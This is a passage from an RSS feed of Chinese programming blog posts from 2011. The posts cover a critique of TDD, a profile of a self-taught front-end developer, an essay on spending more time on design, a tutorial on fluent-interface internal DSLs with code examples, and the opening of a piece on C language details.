<p>就算你在一开始要写一些测试案例，但只要你想让这些测试案例更有意义，那么，你要么得让这些测试案例的测试范围更小更底层更精确，要么你就得在整个软件快要写完的时候再去写测试，要不然你就得欺骗或是篡改测试案例。在为数不多的情形下，前者是正确的——测试围绕于bug，或是小的，定义地很好的功能碎片（陈皓注：我个人理解为单元测试是目前最有效的））</p>
<p>把测试变成整个活动的中心因为其对程序员有用？真牛逼。老实说，控制程序员的工作流程只可能得出一条无比正确的答案——荒谬可笑。</p>
<p>测试帮助程序员，是因为其可以帮程序员组织自动化测试，所以才帮了程序员，而不是cargo-cult（<a href="https://zh.wikipedia.org/zh/%E8%88%B9%E8%B2%A8%E5%B4%87%E6%8B%9C" target="_blank">货物崇拜</a>，参看《<a title="各种流行的编程风格" href="https://coolshell.cn/articles/2058.html" target="_blank">各种流行的编程方法</a>》中的cargo-cult编程）——信仰一种工作流程并让所有的人或事来适应于他。</p>
<p>先写测试这种方法只会在“Developer Driven Testing”（程序员自己驱动的测试）下可行——关注于选取一个正确的方法让程序员更有生产力。生成一堆测试的规则并说这是唯一的真理是不正确的。</p>
<p><strong>一些讨论和想法（在此贴发出数小时后）…</strong></p>
<p>当我这篇博文发出几个小时后，其被转到了别的地方并引发了一些讨论。</p>
<p>在 <a href="https://news.ycombinator.com/item?id=3033129" target="_blank">Hacker News</a> 上，有人说我提出了很多很不错的问题，并且那是真正的有理有据的观点。我在用用户名叫<em>peteretep </em>的回复了一些。</p>
<p>在 <a href="https://www.reddit.com/r/programming/comments/kq001/testdriven_development_youve_gotta_be_kidding_me/">Reddit</a> 上的争论更多更强。那里有很多的人觉得需要写自动化测试。并且这篇博文被大家演变成拥护测试和可实践的建议，我觉得我是误传达了我的想法，我觉得软件测试是非常重要的，而不是根据哪个方法论进行的教条主义！</p>
<p style="text-align: center;">——————————————正文结束——————————————</p>
<p>我在Reddit上看到了下面的事，我也作些评论。</p>
<ul>
<li>大家在讨论很多很多的技术细节，比如如何测试私有方法，如何测试inner class，甚至还有代码。我太喜欢了，这才是真正的讨论，而不是像酷壳这边那些敏粉们说人而不说事的讨论，<strong>那些所谓的敏捷咨询师的话里连一点技术细节都没有</strong>。</li>
</ul>
<ul>
<li>并且也有人说TDD可以让你去Design，但随后就有人说，正真的Design就是Design，而不是hack 测试来强行让你Design。后面有了附和到——有<strong>很多思想意识想用流程来代替思考，软件开发就是需要在某中上下文下去思考，而不是使用某种机制来让你思考</strong> 。</li>
</ul>
<ul>
<li>我看了两极分化的大量的争论，这是我最喜欢看到事。世界就是因为有不同的观点而美好。<strong>有反对才有争论，有争论才有思考，这才是进步的源泉，而不是统一认识，形成标准</strong>。而对于那些党同伐异的，一听到有反对声就激动就要打压的敏粉来说，我只能认为他们的人生观世界观扭曲得就像朝鲜那样。</li>
</ul>
<div>（全文完）</div>
<p></p>
 ]]></content>
<pubDate>2011-10-17T08:38:15+08:00</pubDate>
<guid>https://coolshell.cn/articles/5531.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Stay Hungry, Stay Foolish ！！ ]]></title>
<link>https://coolshell.cn/articles/5651.html</link>
<content><![CDATA[ 
<p>在整个社会都在关注乔帮主的时候，我想在这里和大家分享一个真实的就在我们程序员身边的故事。和我在《<a title="如果你看不见你还能编程吗？" href="https://coolshell.cn/articles/5514.html" target="_blank">如果你看不见你还能编吗？</a>》一文里介绍的那些盲人程序员一样，<strong>同样是Stay Hungry， Stay Foolish。但我个人更认为我今天想要给大家讲述的这个故事对于我们这些普通人更有意义一些。我真心的希望大家认真看完这个“从刷厕所到程序员”故事后，我们能从中感悟到点什么</strong>。</p>
<p>因为朋友的原因，我和一个创业团队经常有些往来，通过这个团队，我认识了这个故事的主人翁——王平（<a href="https://weibo.com/wpingsuper" target="_blank">@wpingsuper</a>）。其实，很早前他在Google Reader和Buzz里follow了我，但我从没和他交流过。而他的经历我却是在上周末去看望这个创业团队的时候才听说。我问他们要了王平的电话，联系了王平，详细地了解了王平的经历，并征得他的同意，在这里给大家分享他的故事。</p>
<p>王平是一个贵州人，03年大学毕业，体育专业，没有任何家庭背景，只能在贵州的山区里的一个中学里当体育老师，月薪150元。可能和大多数心怀梦想的年轻人一样，他并不甘心，从03年到05年间，他有好多次到北京，他觉得在大城市里有他的梦想。于是，他在04年底，05年初，他正式来到了北京，因为大学专业的问题，他无法找像大学生一样找到不错的工作，那时的他只能在北京一家很小的餐馆当清洁工，他在餐馆里洗盘子，扫地，刷厕所，一个月400元钱。</p>
<p>因为他的学历是这个小餐馆里学历最高的，所以，餐馆里出了什么事都会让他对去搞，所以，财务使用的电脑有了故障也让他去修，当时的他根本对电脑完全不知道是怎么一回事，但是自从接触了电脑以后他就迷上了电脑。他和我说，他这个人就是好奇心强，好动，什么都想弄一弄，所以，时间长了，弄得多了，也能为餐饮解决一些没有懂的问题，维护财务电脑就是其中之一。日子一长，虽然还是刷厕所，但是薪水也涨到了800元一个月，就连餐馆的大厨也对他说，他不属于这里，他将来一定会有前途的。当时的他还觉得不可能，笑了笑就过了。</p>
<p><span id="more-5651"></span></p>
<p>直到07年的一天，餐馆的会计对他说——“看你对电脑那么有兴趣，你应该去学习一下电脑”，这句话点醒了他。于是他在报纸上找到了一个教做网页的培训班，培训分成三期，近一年，每期需要7000元钱，好心的那个会计给了他6000元钱，让他可以在周末参加这个培训班。他和我说，这个会计是他的贵人，换钱的时候她也比较推辞，至今他也还和那位会计老师保持联系。</p>
<p>不过好景不长，只上了一期，问题来了，餐馆周末也要上班，他无法去参加培训班了。所以，他只好辞职，去了中日友好医院，当一个送药工，就是用板车把药从这个地方送到另一个地方，全是体力活，一个月只有200元钱，不过他有了周末可以去培训班的那个时间。但是钱也花完了，上了两期都没法继续了。他和我说，当时觉得只要能活着就行，吃不饱无所谓。</p>
<p>此时的他虽然上了网页制作的培训班，但是因为没有实际做一个东西，所以就算是培训了也什么都不懂。这时他看到Java是一个很不错的方向，所以，想学Java。于是，08年初的时候，他用自己以前办的信用卡向银行申请了个人贷款，去报了一个需要14000多元的Java的培训班。此时，他认识了我的朋友——阎斌（<a href="https://weibo.com/yanbin001" target="_blank">@yanbin001</a>），我这个朋友当时在这个培训公司里做讲师，讲Java。</p>
<p>没有计算机基础的王平学习Java的难度可想而之，非常地痛苦，所以，阎斌看到他懂点网页开发，就让他别学Java了，搞搞Web的前端网页开发。而且，我这个朋友阎斌是个创业狂，所以，经常拉着王平一起去和他做互联网上的产品，并让王平去研究一些别人做的网页，于是王平从此学会做了Web前端，并开始能独立开发一些前端网页，有了实实在在的锻炼，王平他开始真正会用html + css，还会一点点js。</p>
<p>09年4月份的时候，王平在北京西四环找到了第一份像样的工作，是一家做保健品的小公司，需要做一个公司的网站，月薪3400元。这让他得以还清了欠银行的钱。他还和我开玩笑说，他和我做的都是电子商务。当然，这对于他来说他并不满足。而我那个创业狂的朋友阎斌，又叫他出来创业，可惜创业再次未果。他只好又回去打工。</p>
<p>2010年4月份的时候，他到了12580做前端开发，月薪4000元左右。他说，12580的前端开发只有他一个人，今天12580的网页90%以上还是他写的，并且他还让给了我这个链接：<a href="http://12580.10086.cn/" target="_blank">http://12580.10086.cn/</a>。大家可以去看看，你能想得到这个网页是出自一个以前对电脑一窍不通在饭馆里做清洁的人之手吗？</p>
<p>此时的王平，对Web前端开发已经是驾轻就熟，非常熟练，就连后端的工程师对他也非常佩服。 觉得他用CSS和JS用得直是相当的不错。当然，王平并不满意这份工作，在10年的11月份，他换到了现在的工作单位——百度和日本Rokuten的合资公司——<a href="http://www.rakuten.cn/" target="_blank">乐酷天</a>。还是老样子，他一个人负责所有的前端开发，不过这次的跳槽，他找到了一份相当不错的薪水。我对这份薪水的理解是——高级前端开发程序员。我引用我另外一个在微软和出过国并和王平一同工作过的朋友的话——“王平太猛了，CSS和JS用得巨熟无比，每次我们请他帮我们搞定一个网页效果，我们问他2天行不行，结果他2个小时就搞定了！”。</p>
<p>好了，我的故事到这里要结束了，先让我们来看一看80后王平的样子吧。</p>
<figure id="attachment_5652" aria-describedby="caption-attachment-5652" style="width: 585px" class="wp-caption aligncenter"><img alt="image placeholder" ><figcaption id="caption-attachment-5652" class="wp-caption-text">在享受工作的王平，个人博客 http://www.soboom.com</figcaption></figure>
<p>我不知道你看完这个故事后是什么样的感受。我有两个感觉——</p>
<ul>
<li>乔布斯说Stay Hungry, Stay Foolish。今天，当我们所有的人都在仰望神一样的乔布斯的时候，在我们津津乐道那些浪潮之巅的人物时，在听过王平对我讲述他的经历过后，我只想说，其实，我们大多数人真的不懂什么是——Stay Hungry, Stay Foolish。包括我自己在内。</li>
</ul>
<ul>
<li>王平让还让我想到了电影《命运规划局》里的最后一句话，大概是这样说的——“<strong>大多数人按照我们所安排的路线生活，害怕探索其它路线，但也会有一些人，他们并不满足于被设定的生活轨迹，冲破我们设置的重重阻碍，意识到自由意志是天赐之物的人，才明白只有在奋力抗争后才知道如何善用之</strong>。”</li>
</ul>
<p>（全文完）</p>
<p><em><strong>————更新 2011/10/20 15:00————</strong></em></p>
<p>有些人觉得这篇文章是给培训公司做广告或是炒作。有些人觉得几百元钱在北京生存并不可能。我可以理解你们的怀疑，但这些言论让我有些无语，我只希望你们能在做些调查后，再做这样的结论。<strong><span style="color: #cc0000;">你可以看到，王平在第一个培训公司没有学到什么，在第二个培训公司也没有学到什么，而是在和我的朋友阎斌去尝试创业时才学到了很多。呼唤这些人的阅读智商啊</span></strong>。</p>
<p>这个世界有时候并不是像我们所想像的那样，在北京，几百元一个月的人并不少，上大学也好，去培训公司也好，这都不重要，重要的是我们想改变自己的那种心态和积极。而我只希望王平的经历能给大家带来人生的一些感触。</p>
 ]]></content>
<pubDate>2011-10-20T08:26:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/5651.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 多些时间能少写些代码 ]]></title>
<link>https://coolshell.cn/articles/5686.html</link>
<content><![CDATA[ 
<p>我在我的微博上说过<a href="https://weibo.com/1401880315/xmYMteUWT" target="_blank">这样一段话</a>，我想在这里把我的这个观点阐述地更完整一些。</p>
<blockquote><p><a href="https://weibo.com/haoel" target="_blank">@左耳朵耗子</a>：聪明的程序员使用50%-70%的时间用来思考，尝试和权衡各种设计和实现，而用30% – 50%的时间是在忙碌着编码，调试和测试。聪明的老板也会让团队这样做。而傻逼的老板，苦逼的程序员会拿出来100%-150%的时间来忙着赶进度，返工，重构，fix 大量的bug… 所以， 越差的团队一般会越忙，而且还忙不完。</p></blockquote>
<p>在现在这个浮躁的时期，再加上敏捷咨询师们念的歪经，他们让人感觉上就像是软件产品是可以在很短的时间内高质量的完成的，这令那些管理者们很兴奋，就像巴甫洛夫的条件反射实验中的狗看到了肉就会流口水那样兴奋。他们使用TDD，快速迭代，不断重构，持续集成直至持续部署的方法在进行软件开发。</p>
<p>软件开发真是这样的吗？难道不需要花时间去思考吗？对此，有些观点在Todd的《<a title="“品质在于构建过程”吗？" href="https://coolshell.cn/articles/5625.html" target="_blank">“品质在于构建过程”吗？</a>》以及《<a title="Bob大叔和Jim Coplien对TDD的论战" href="https://coolshell.cn/articles/4891.html" target="_blank">Bob大叔和Jim Coplien对TDD的论战</a>》中谈到过了。我只想想表达下面的观点：</p>
<ul>
<li>
<strong>软件的精髓在于设计，设计是一件很费大脑的事件</strong>。对于软件来说，设计没有完美的，它总是一件需要取舍需要权衡的事，比如：时间换空间，空间换时间，TCP或UDP，同步还是异步，数据冗余还不冗余等等。那怕是一个小小的observers模式是pull方式还是push方式 都需要仔细讨论。这些的东西需要时间和做前期尝试。</li>
</ul>
<ul>
<li>
<strong>TDD</strong>、<strong>快速原型和迭代可能会对软件和团队产生负面影响</strong>。在一开始，你需要花很大的精力来让你的软件从无到有（做过软件的人都知道，从零开始写代码是很痛苦的事），但是因为你没有想好，先做再说，所以，后期你会面临更多的质量问题而让你需要花更多的时间精力。当然，那些咨询师会让你用持续集成和持续部署这样的方法。但我想告诉你，这并不解决你软件设计的缺陷。举个例子——TDD、迭代、原型只关注功能性需求，其不会关注非功能性需求，比如性能问题，高可用性问题，系统维护问题（模块的耦合问题），等等。而这些问题往往都可以让你的软件设计重新来过。</li>
</ul>
<ul>
<li>
<strong>重构是恶梦，重构应该越少越好</strong>。当你维护一个复杂的系统时你会知道重构是一件多么恐怖的事情（参看《<a title="重构代码的7个阶段" href="https://coolshell.cn/articles/5201.html" target="_blank">重构代码的7个阶段</a>》）。如果一开始没有想好，你要面临的不单单是re-design, re-architect，还要面对时间和人力成本的增加，最难的是你还要面对的是团队士气因为不断的rework而逐渐低落并产生厌倦和懈怠情绪。</li>
</ul>
<p><span id="more-5686"></span></p>
<p>所以，如果你能有多一些时间去和客户讨论一下需求和未来可能的变化，去调查一下实现的技术难点和细节，去和其他有经验的人讨论并推敲一下架构和设计，去思考设计上的缺陷，那么，你的coding会变得非常地直，直到你一眼就看到尽头，你的测试案例也会写得非常地好，你会几乎不需要重构，于是，你会在未来少写很多代码，从而你的软件开发会越来越轻松，直到技术开始换代。</p>
<p>我现在在做的项目，花了几乎4个月的时间来做设计，在这个过程中，我们反复思考、讨论和权衡若干种实现方法，并尽可能地穷举所有的场景和细节以及未来可能的变化（那怕是那些简单的模块），有个模块被重写了至少三次，每次都是写到一半就被推翻重写，我们整个团队不断地在和其它团队讨论，并在对系统不断地认识中对系统进行简化和优化，并力求达到完美。现在看来，没有贸然使用Scrum是明智的。</p>
<p>这就好像我们修路造桥一样，我们需要花大量的时间勘测地形地质，分析数据，思考可能出现的各种问题（各种自然灾害），评估不同的设计方案，而不是先尽快建好再说。</p>
<p>所以，<strong>多一些时间，不是让你多做几次迭代，多完成几个模块，而是可以让你少写一些代码，更快的交付一个更好的产品</strong>。</p>
<p>我相信你会有很多疑问，下面是我觉得你可能会有下面的一些观点，让我一条一条来回复：</p>
<ul>
<li>
<strong>首当其冲的一定会是项目的deadline，或是那种你没有活语权的项目。</strong>比如做那种“甲乙方合同式的项目”，我把这种项目统一认为是“外包项目”，在这种项目性质下，你很难有话语权。对此，我觉得，1）作为乙方的你还是应该和甲方在项目计划上争取一下，晓之以情，动之以理。2）如果不行，只能在时间、需求范围和质量上做一个权衡。另外，<strong>在这种情况下你要找一个方法，把你的压力和痛苦分担给用户和领导。</strong>（找到这个方法的前提需要你找到用户和领导他们害怕什么，嘿嘿）</li>
</ul>
<ul>
<li>
<strong>过度设计和纸上谈兵</strong>。有人说会不会设计太多，造成过度设计，或是在设计上花太多的时间。这有可能。我上一家公司的一个项目团队就花了1年多的时间来不停不停的开会和做设计，结果release的时候还有1000多个bug。这个问题的原因是，这个团队的设计是在纸上谈兵，开会是开神仙会，讨论的设计都是浮云。所以，<strong>设计并不是讨论和思考，还需要去尝试，</strong>我认为当你的设计完成的时候，你的骨干核心代码都基本完成了。</li>
</ul>
<ul>
<li>
<strong>我的团队成员水平太差，不会思考</strong>。首先，先恭喜你找到一堆码农，当然，这不怪你，这是中国教育和大环境的问题，让人不会思考。对于这样的情况，我有两个建议，1）量力而行，使多大的碗就吃多少饭。2）鼓励思考，那怕那些想法很不靠谱，因为如果不开始，那么将永远不会思考。</li>
</ul>
<ul>
<li>
<strong>必需使用快速迭代</strong>。很多公司都在强行上敏捷，他们希望产品越快release越好，而没有充分的时间思考和讨论。对于这种项目，我的建议是，1）找有丰富经验的人来做。2）迭代过程中力求架构和程序逻辑的简单，简单，再简单，力求代码间的高内聚，低耦合。不然，重构的时候你就好玩了。</li>
</ul>
<ul>
<li>
<strong>创业团队必需要快</strong>。做得快就是做得好吗？很多时候，不是谁快谁就能笑到最后的。这样的例子太多了。第一个做出来的人并不一定就会占领市场，其很有可能会成为先驱。</li>
</ul>
<ul>
<li>
<strong>有钱的公司才会让团队用更多的时间去思考</strong>。错了，你们没有见过有钱的公司，有钱的公司可以招一堆干不成活的人，可以把事搞乱了再新来过，甚至可以把做失败的项目换个名字再重新立项。这些真正的有钱的公司只求快，只求人多，不怕做错决定。像我们这些没钱的人，干什么事都是小心翼翼地，生怕做错决定。</li>
</ul>
<p>关于软件项目管理的文章，还可以参看《<a title="软件公司的两种管理方式" href="https://coolshell.cn/articles/4951.html">软件公司的两种管理方式</a>》，最后，欢迎大家表达观点。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-10-25T08:24:44+08:00</pubDate>
<guid>https://coolshell.cn/articles/5686.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ API设计：用流畅接口构造内部DSL ]]></title>
<link>https://coolshell.cn/articles/5709.html</link>
<content><![CDATA[ 
<p><strong>感谢<a href="https://weibo.com/n/weidagang">@weidagang</a> （Todd）向酷壳投递本文。</strong></p>
<p>程序设计语言的抽象机制包含了两个最基本的方面：一是语言关注的基本元素/语义；另一个是从基本元素/语义到复合元素/语义的构造规则。在C、C++、Java、C#、Python等通用语言中，语言的基本元素/语义往往离问题域较远，通过API库的形式进行层层抽象是降低问题难度最常用的方法。比如，在C语言中最常见的方式是提供函数库来封装复杂逻辑，方便外部调用。</p>
<p>不过普通的API设计方法存在一种天然的陷阱，那就是不管怎样封装，大过程虽然比小过程抽象层次更高，但本质上还是过程，受到过程语义的制约。也就是说，通过基本元素/语义构造更高级抽象元素/语义的时候，语言的构造规则很大程度上限制了抽象的维度，我们很难跳出这个维度去，甚至可能根本意识不到这个限制。而SQL、HTML、CSS、make等DSL（领域特定语言）的抽象维度是为特定领域量身定做的，从这些抽象角度看问题往往最为简单，所以DSL在解决其特定领域的问题时比通用程序设计语言更加方便。通常，SQL等非通用语言被称为外部DSL（External DSL）；在通用语言中，我们其实也可以在一定程度上突破语言构造规则的抽象维度限制，定义内部DSL（Internal DSL）。</p>
<p>本文将介绍一种被称为流畅接口（Fluent Interface）的内部DSL设计方法。Wikipedia上<a title="Fluent Interface" href="https://en.wikipedia.org/wiki/Fluent_interface">Fluent Interface</a>的定义是：</p>
<blockquote><p>A fluent interface (as first coined by Eric Evans and Martin Fowler) is an implementation of an object oriented API that aims to provide for more readable code. A fluent interface is normally implemented by using method chaining to relay the instruction context of a subsequent call (but a fluent interface entails more than just method chaining).</p></blockquote>
<div>
<p>下面将分4个部分来逐步说明流畅接口在构造内部DSL中的典型应用。</p>
</div>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#1_%E5%9F%BA%E6%9C%AC%E8%AF%AD%E4%B9%89%E6%8A%BD%E8%B1%A1" title="1. 基本语义抽象">1. 基本语义抽象</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#2_%E7%AE%A1%E9%81%93%E6%8A%BD%E8%B1%A1" title="2. 管道抽象">2. 管道抽象</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#3_%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%8A%BD%E8%B1%A1" title="3. 层次结构抽象">3. 层次结构抽象</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#4_%E5%BC%82%E6%AD%A5%E6%8A%BD%E8%B1%A1" title="4. 异步抽象">4. 异步抽象</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="1_%E5%9F%BA%E6%9C%AC%E8%AF%AD%E4%B9%89%E6%8A%BD%E8%B1%A1"></span><strong>1. 基本语义抽象</strong><span class="ez-toc-section-end"></span>
</h4>
<p>如果要输出0..4这5个数，我们一般会首先想到类似这样的代码：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">//Java
for (int i = 0; i &lt; 5; ++i) {
    system.out.println(i);
}</pre>
<p><span id="more-5709"></span></p>
<p>而Ruby虽然也支持类似的for循环，但最简单的是下面这样的实现：</p>
<p></p>
<pre data-enlighter-language="ruby" class="EnlighterJSRAW">//Ruby
5.times {|i| puts i}</pre>
<p>Ruby中一切皆对象，5是Fixnum类的实例，times是Fixnum的一个方法，它接受一个block参数。相比for循环实现，Ruby的times方式更简洁，可读性更强，但熟悉OOP的朋友可能会有疑问，times是否应该作为整型类的方法呢？在OOP中，方法调用通常代表了向对象发送消息，改变或查询对象的状态，times方法显然不是对整型对象状态的查询和修改。如果你是Ruby的设计者，你会把times方法放入Fixnum类吗？如果答案是否定的，那么Ruby的这种设计本质上代表了什么呢？实际上，这里的times虽然只是一个普通的类方法，但它的目的却与普通意义上的类方法不同，它的语义实际上类似于for循环这样的语言基本语义，可以被视为一种自定义的基本语义。times的语义从一定程度上跳出了类方法的框框，向问题域迈进了一步！</p>
<p>另一个例子来自Eric Evans的“用两个时间点构造一个时间段对象”，普通设计：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">//Java
TimePoint fiveOClock, sixOClock;
TimeInterval meetingTime = new TimeInterval(fiveOClock, sixOClock);</pre>
<p>另一种Evans的设计是这样：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">//Java
TimeInterval meetingTime = fiveOClock.until(sixOClock);</pre>
<p>按传统OO设计，until方法本不应出现在TimePoint类中，这里TimePoint类的until方法同样代表了一种自定义的基本语义，使得表达时间域的问题更加自然。</p>
<p>虽然上面的两个简单例子和普通设计相比看不出太大的优势，但它却为我们理解流畅接口打下了基础。重要的是应该体会到它们从一定程度上跳出了语言基本抽象机制的束缚，我们不应该再用类职责划分、迪米特法则（Law of Demeter）等OO设计原则来看待它们。</p>
<h4>
<span class="ez-toc-section" id="2_%E7%AE%A1%E9%81%93%E6%8A%BD%E8%B1%A1"></span><strong>2. 管道抽象</strong><span class="ez-toc-section-end"></span>
</h4>
<p>在Shell中，我们可以通过管道将一系列的小命令组合在一起实现复杂的功能。管道中流动的是单一类型的文本流，计算过程就是从输入流到输出流的变换过程，每个命令是对文本流的一次变换作用，通过管道将作用叠加起来。在Shell中，很多时候我们只需要一句话就能完成log统计这样的中小规模问题。和其他抽象机制相比，管道的优美在于无嵌套。比如下面这段C程序，由于嵌套层次较深，不容易一下子理解清楚：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">//C
min(max(min(max(a,b),c),d),e)
</pre>
<p>而用管道来表达同样的功能则清晰得多：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">#!/bin/bash
max a b | min c | max d | min e
</pre>
<p>我们很容易理解这段程序表达的意思是：先求a, b的最大值；再把结果和c取最小值；再把结果和d求最大值；再把结果和e求最小值。</p>
<p>jQuery的链式调用设计也具有管道的风格，方法链上流动的是同一类型的jQuery对象，每一步方法调用是对对象的一次作用，整个方法链将各个方法的作用叠加起来。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//Javascript
$('li').filter(':event').css('background-color', 'red');
</pre>
<h4>
<span class="ez-toc-section" id="3_%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84%E6%8A%BD%E8%B1%A1"></span>3. 层次结构抽象<span class="ez-toc-section-end"></span>
</h4>
<p>除了管道这种“线性”结构外，流畅接口还可用于构造层次结构抽象。比如，用Javascript动态创建创建下面的HTML片段：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;div id="’product_123’" class="’product’"&gt;
&lt;img src="’preview_123.jpg’" alt="" /&gt;
&lt;ul&gt;
	&lt;li&gt;Name: iPad2 32G&lt;/li&gt;
	&lt;li&gt;Price: 3600&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;

</pre>
<p>若采用Javascript的DOM API：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">//Javascript
var div = document.createElement('div');
div.setAttribute(‘id’, ‘product_123’);
div.setAttribute(‘class’, ‘product’);

var img = document.createElement('img');
img.setAttribute(‘src’, ‘preview_123.jpg’);
div.appendChild(img);

var ul = document.createElement('ul');
var li1 = document.createElement('li');
var txt1 = document.createTextNode("Name: iPad2 32G");
li1.appendChild(txt1);
…
div.appendChild(ul);</pre>
<p>而下面流畅接口API则要有表现力得多：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">//Javascript
var obj =
$.div({id:’product_123’, class:’product’})
    .img({src:’preview_123.jpg’})
    .ul()
        .li().text(‘Name: iPad2 32G’)._li()
        .li().text(‘Price: 3600’)._li()
    ._ul()
 ._div();</pre>
<div>和Javascript的标准DOM API相比，上面的API设计不再局限于孤立地看待某一个方法，而是考虑了它们在解决问题时的组合使用，所以代码的表现形式特别贴近问题的本质。这样的代码是自解释的（self-explanatory）在可读性方面要明显胜于DOM API，这相当于定义了一种类似于HTML的内部DSL，它拥有自己的语义和语法。需要特别注意的是，上面的层次结构抽象和管道抽象有着本质的不同，管道抽象的方法链上通常是同一对象的连续传递，而层次抽象中方法链上的对象却在随着层次的变化而变化。此为，我们可以把业务规则也表达在流畅接口中，比如上面的例子中，body()不能包含在div()返回的对象中，div().body()将抛出”body方法不存在”异常。</div>
<h4>
<span class="ez-toc-section" id="4_%E5%BC%82%E6%AD%A5%E6%8A%BD%E8%B1%A1"></span><strong>4. 异步抽象</strong><span class="ez-toc-section-end"></span>
</h4>
<div>流畅接口不仅可以构造复杂的层次抽象，还可以用于构造异步抽象。在基于回调机制的异步模式中，多个异步调用的同步和嵌套问题是使用异步的难点所在。有时一个稍复杂的调用和同步关系会导致代码充满了复杂的同步检查和层层回调，难以理解和维护。这个问题从本质上讲和上面HTML的例子一样，是由于多数通用语言并未把异步作为基本元素/语义，许多异步实现模式是向语言的妥协。针对这个问题，我用Javascript编写了一个基于流畅接口的异步DSL，示例代码如下：</div>
<div>[javascript]<br>
//Javascript<br>
$.begin()<br>
.async(newTask(‘task1’), ‘task1’)<br>
.async(newTask(‘task2’), ‘task2’)<br>
.async(newTask(‘task3’), ‘task3’)<br>
.when()<br>
.each_done(function(name, result) {<br>
console.log(name + ‘: ‘ + result);})<br>
.all_done(function(){ console.log(‘good, all completed’); })<br>
.timeout(function(){<br>
console.log(‘timeout!!’);<br>
$.begin()<br>
.async(newTask(‘task4’), ‘task4’)<br>
.when()<br>
.each_done(function(name, result) {<br>
console.log(name + ‘: ‘ + result); })<br>
.end();}<br>
, 3000)<br>
.end();[/javascript]
</div>
<div>上面的代码只是一句Javascript调用，但从另一个角度看它却像一段描述异步调用的DSL程序。它通过流畅接口定义了begin when end的语法结构，begin后面跟的是启动异步调用的代码；when后面是异步结果处理，可以选择each_done, all_done, timeout中的一种或多种。而begin when end结构本身是可以嵌套的，比如上面的代码在timeout处理分支中就包含了另一个begin when end结构。通过这个DSL，我们可以比基于回调的方式更好地表达异步调用的同步和嵌套关系。</div>
<p>上面介绍了用流畅接口构造的4种典型抽象，出此之外还有很多其他的抽象和应用场合，比如：不少单元测试框架就通过流畅接口定义了单元测试的DSL。虽然上面的例子以Javascript等动态语言居多，但其实流畅接口所依赖的语法基础并不苛刻，即使在Java这样的静态语言中，同样可以轻松地使用。流畅接口不同于传统的API设计，理解和使用流畅接口关键是要突破语言抽象机制带来的定势思维，根据问题域选取适当的抽象维度，利用语言的基本语法构造领域特定的语义和语法。</p>
<p><strong>参考</strong></p>
<ul>
<li><a title="Wikipedia: Fluent Interface" href="https://en.wikipedia.org/wiki/Fluent_interface">Wikipedia: Fluent Interface</a></li>
<li><a title="Martin Fowler: Fluent Interface" href="http://www.martinfowler.com/bliki/FluentInterface.html">Martin Fowler: Fluent Interface</a></li>
<li><a title="jQuery is DSL" href="https://www.cnblogs.com/cathsfz/archive/2009/08/10/1543266.html">jQuery is DSL</a></li>
<li><a title="An Approach to Internal Domain-Specific Languages in Java" href="http://www.infoq.com/articles/internal-dsls-java">An Approach to Internal Domain-Specific Languages in Java</a></li>
</ul>
<p></p>
 ]]></content>
<pubDate>2011-10-31T08:28:47+08:00</pubDate>
<guid>https://coolshell.cn/articles/5709.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 深入理解C语言 ]]></title>
<link>https://coolshell.cn/articles/5761.html</link>
<content><![CDATA[ 
<p>Dennis Ritchie  过世了，他发明了C语言，一个影响深远并彻底改变世界的计算机语言。一门经历40多年的到今天还长盛不衰的语言，今天很多语言都受到C的影响，C++，Java，C#，Perl， PHP， Javascript， 等等。但是，你对C了解吗？相信你看过本站的《<a title="C语言的谜题" href="https://coolshell.cn/articles/945.html" target="_blank">C语言的谜题</a>》还有《<a title="谁说C语言很简单？" href="https://coolshell.cn/articles/873.html" target="_blank">谁说C语言很简单？</a>》，这里，我再写一篇关于深入理解C语言的文章，一方面是缅怀Dennis，另一方面是告诉大家应该如何学好一门语言。（顺便注明一下，下面的一些例子来源于<a href="http://www.slideshare.net/olvemaudal/deep-c" target="_blank">这个slides</a>）</p>
<p>首先，我们先来看下面这个经典的代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main()
{
    int a = 42;
    printf(“%d\n”, a);
}</pre>
<p>从这段代码里你看到了什么问题？我们都知道，这段程序里少了一个#include &lt;stdio.h&gt; 还少了一个return 0;的返回语句。</p>
<p>不过，让我们来深入的学习一下，</p>
<ul>
<li>这段代码在C++下无法编译，因为C++需要明确声明函数</li>
<li>这段代码在C的编译器下会编译通过，因为在编译期，编译器会生成一个printf的函数定义，并生成.o文件，链接时，会找到标准的链接库，所以能编译通过。</li>
